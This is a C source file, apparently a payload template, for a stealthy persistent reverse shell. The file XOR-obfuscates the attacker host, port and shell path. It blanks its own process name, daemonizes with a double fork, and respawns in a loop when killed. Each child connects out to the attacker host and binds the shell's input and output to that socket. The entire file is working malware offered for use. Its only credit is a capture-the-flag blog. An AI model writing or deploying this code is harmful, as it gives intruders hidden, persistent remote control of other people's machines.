/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
#include "xor.h"
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/inet.h>

#define LHOST xor( from_hex(lhost), "{OBF_KEY}")
#define LPORT xor( from_hex(lport), "{OBF_KEY}")
#define SHELL xor( from_hex(shell), "{OBF_KEY}")

void daemonize() {
    int status;
    pid_t pid;

    //http://thinkiii.blogspot.com/2009/12/double-fork-to-avoid-zombie-process.html
    //Unix double fork to daemonize
    if (pid = fork()) {
        //First parent (grandparent)
        waitpid(pid, &status, 0);        
    } else {
        //First child (parent)
        if (pid = fork()) {
            //Parent -- orphan the grandchild
            exit(0);
        } else {
            //Grandchild
            return;
        }
    }
    
    exit(0);
}

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s, status;
    //Have to declare strings as char arrays to prevent
    // gcc from storing them in read-only memory
    // (https://stackoverflow.com/questions/164194/why-do-i-get-a-segmentation-fault-when-writing-to-a-string-initialized-with-cha)
    char lhost[] = "{LHOST}";
    char lport[] = "{LPORT}";
    char shell[] = "{SHELL}";
    pid_t pid;

    //Delete process name
    for (int i=0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }

    daemonize();

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(LHOST);
    sa.sin_port = htons(atoi(LPORT));
    while (1) {
        //Cycle through PIDs when killed
        daemonize();
        if (pid = fork()) {
            waitpid(pid, &status, 0);        
        } else {
            s = socket(AF_INET, SOCK_STREAM, 0);
            connect(s, (struct sockaddr *)&sa, sizeof(sa));
            dup2(s, 0);
            dup2(s, 1);
            dup2(s, 2);

            execve(SHELL, 0, 0);
        }
    }
    return 0;
}
